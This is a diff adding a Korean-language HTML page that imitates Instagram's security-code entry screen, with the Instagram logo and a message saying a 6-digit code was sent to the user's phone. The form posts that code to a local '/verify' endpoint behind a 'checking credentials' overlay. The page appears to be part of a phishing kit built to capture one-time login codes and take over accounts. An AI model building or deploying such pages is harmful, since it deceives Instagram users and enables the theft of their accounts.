@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • 보안 코드 입력</title>
+    <style>
+        body { background-color: #121c26; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 90%; max-width: 350px; text-align: center; }
+        
+        /* 인스타 로고 추가 */
+        .insta-logo {
+            width: 175px;
+            margin-bottom: 40px;
+            filter: invert(1);
+        }
+
+        .info-text { font-size: 14px; color: #a8a8a8; margin-bottom: 30px; line-height: 1.5; }
+        input { width: 100%; padding: 14px; margin-bottom: 20px; background-color: rgba(255, 255, 255, 0.05); border: 1px solid #363636; border-radius: 12px; color: white; text-align: center; font-size: 20px; letter-spacing: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #0064e0; border: none; border-radius: 25px; color: white; font-weight: 600; cursor: pointer; }
+        
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading-overlay">
+        <p style="color: white;">인증 정보를 확인 중입니다...</p>
+    </div>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo" alt="Instagram">
+        
+        <h2 style="font-size: 18px; margin-bottom: 10px;">보안 코드 입력</h2>
+        <p class="info-text">계정을 보호하기 위해 6자리 보안 코드를 입력하세요. 코드가 휴대폰으로 전송되었습니다.</p>
+        
+        <form id="otpForm" action="/verify" method="POST">
+            <input type="text" name="otp_code" placeholder="000000" maxlength="6" inputmode="numeric" required>
+            <button type="submit">확인</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('otpForm').onsubmit = function() {
+            document.getElementById('loading-overlay').style.display = 'flex';
+            return true;
+        };
+    </script>
+</body>
+</html>
